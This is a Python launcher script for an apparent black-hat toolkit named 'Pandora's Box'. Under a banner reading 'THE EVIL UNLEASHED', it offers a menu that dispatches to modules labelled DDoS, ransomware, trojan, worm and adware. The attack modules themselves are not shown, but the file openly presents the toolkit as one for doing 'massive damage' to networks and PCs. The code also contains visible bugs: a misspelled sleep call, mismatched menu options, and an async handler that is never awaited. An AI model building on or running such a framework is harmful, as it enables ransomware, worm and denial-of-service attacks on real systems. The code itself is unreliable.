import colorama
from termcolor import colored as c
from colorama import init as colorInit
from module.horus import Horus
from module.anubitz import Anubitz
from module.amunra import Amunra
from module.seth import Seth
from module.hathor import Hathor
from module.isis import Isis
import sys, os, time, asyncio

class PandorasBox:

    def __init__(self):

        self.BANNER =(rf"""
                                     ;                                                         
                                     ED.              :                                        
                      L.             E#Wi            t#,                                      .
 t                    EW:        ,ft E###G.         ;##W.   j.                               ;W
 ED.               .. E##;       t#E E#fD#W;       :#L:WE   EW,                   ..        f#E
 E#K:             ;W, E###t      t#E E#t t##L     .KG  ,#D  E##j                 ;W,      .E#f 
 E##W;           j##, E#fE#f     t#E E#t  .E#K,   EE    ;#f E###D.              j##,     iWW;  
 E#E##t         G###, E#t D#G    t#E E#t    j##f f#.     t#iE#jG#W;            G###,    L##Lffi
 E#ti##f      :E####, E#t  f#E.  t#E E#t    :E#K::#G     GK E#t t##f         :E####,   tLLG##L 
 E#t ;##D.   ;W#DG##, E#t   t#K: t#E E#t   t##L   ;#L   LW. E#t  :K#E:      ;W#DG##,     ,W#i  
 E#ELLE##K: j###DW##, E#t    ;#W,t#E E#t .D#W;     t#f f#:  E#KDDDD###i    j###DW##,    j#E.   
 E#L;;;;;;,G##i,,G##, E#t     :K#D#E E#tiW#G.       f#D#;   E#f,t#Wi,,,   G##i,,G##,  .D#j     
 E#t     :K#K:   L##, E#t      .E##E E#K##i          G#t    E#t  ;#W:   :K#K:   L##, ,WK,      
 E#t    ;##D.    L##, ..         G#E E##D.            t     DWi   ,KK: ;##D.    L##, EG.       
        ,,,      .,,              fE E#t                               ,,,      .,,  ,         
                                   , L:                                                        

                                             :                
                                            t#,               
                               .           ;##W.              
                               Ef.        :#L:WE              
                               E#Wi      .KG  ,#D  :KW,      L
                               E#K#D:    EE    ;#f  ,#W:   ,KG
                               E#t,E#f. f#.     t#i  ;#W. jWi 
                               E#WEE##Wt:#G     GK    i#KED.  
                               E##Ei;;;;.;#L   LW.     L#W.   
                               E#DWWt     t#f f#:    .GKj#K.  
                               E#t f#K;    f#D#;    iWf  i#K. 
                               E#Dfff##E,   G#t    LK:    t#E 
                               jLLLLLLLLL;   t     i       tDj
                                                              
                                --- THE EVIL UNLEASHED ---
                                       | S3R43o3 |
                              
        """)
        self.menuframe = (rf"""
            1) Horus (DDoS)
            2) Anubitz (Ransomware)
            3) Seth (Trojaner)
            4) Amun-Ra (Worm)
            5) Hathor (AddWare)
            6) Isis (Honeypot)
            7) Baset (MITM) *not active

            0) Exit""")
        self.attention = (rf"""
__________________________________________________________________________________________________________
!!! ATTENTION !!!
IF YOU NOT COMFORTABLE WITH BASICS OF TCP/IP OR/AND BASICS PROGRAMMING KNOWLEDGE:
---- DONT USE THIS TOOLS! THIS TOOLS HAVE THE POTENTION TO DO MASSIVE DAMAGE ON NETWORKS OR/AND PC'S! ----
I WILL DO NOT GIVE ANY GUARANTEE. I ALSO ACCEPT NO LIABILITY FOR ANY DAMAGE TO SYSTEMS AND/OR NETWORKS!
USE IT ON YOUR OWN RISK!

>>> ~BLACK HAT UNITED~ <<<
>>> FIGHT FOR UKRAINE: OPRussia <<< 
--- S3R43o3 ---
__________________________________________________________________________________________________________""")

    def mainMenu(self):
        options ={
            1:'runHorus',
            2:'runAnubitz',
            3:'runAmunra',
            4:'runSeth',
            5:'runHathor',
            6: 'runIsis',
            7:'runBaset',
            0:'exit'
        }
        print(c(self.BANNER, 'red', attrs=['bold']))
        print(c(self.attention, 'red', attrs=['bold']))
        print(c(self.menuframe, 'red', attrs=['bold']))
        choice = input(colorama.Fore.BLUE+'[x] Select option: '+ colorama.Fore.RESET)
        if choice == "":
            print(c('[!] Pandora: Please select a valid option', 'red', attrs=['bold']))
            time.sleep(0.6)
            return self.mainMenu()
        choice = int(choice)
        if choice not in options:
            print(c('[!] Pandora: Please select a valid option', 'red', attrs=['bold']))
            time.slee(0.6)
            return self.mainMenu()
        elif choice == 1:
            self.runHorus()
        elif choice == 2:
            self.runAnubitz()
        elif choice == 3:
            self.runAmunra()
        elif choice == 4:
            self.runSeth()
        elif choice == 5:
            self.runHathor()
        elif choice == 6:
            self.runIsis()
        elif choice == 7:
            print('This module is currently not avaible!')
            return self.mainMenu()
        elif choice == 0:
            sys.exit(0)

    def runHorus(self):
        horus = Horus()
        try:
            horus.horusMenu()
        except KeyboardInterrupt:
            sys.exit(0)
        finally:
            sys.exit(0)

    def runBaset(self):
        pass

    async def runAnubitz(self):
        anubitz = Anubitz()
        try:
            await anubitz.main()
        except KeyboardInterrupt:
            sys.exit(0)
        finally:
            sys.exit(0)

    def runIsis(self):
        isis = Isis()
        try:
            isis.setup()
        except KeyboardInterrupt:
            sys.exit(0)
        finally:
            sys.exit(0)

    def runAmunra(self):
        amunra = Amunra()
        try:
            amunra.main()
        except KeyboardInterrupt:
            sys.exit(0)
        finally:
            sys.exit(0)
    
    def runSeth(self):
        seth = Seth()
        try:
            seth.main()
        except KeyboardInterrupt:
            sys.exit(0)
        finally:
            sys.exit(0)
    def runHathor(self):
        hathor = Hathor()
        try:
            hathor.main()
        except KeyboardInterrupt:
            sys.exit(0)
        finally:
            sys.exit(0)

def main():
    colorInit()
    panodra = PandorasBox()
    panodra.mainMenu()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
    finally:
        sys.exit()

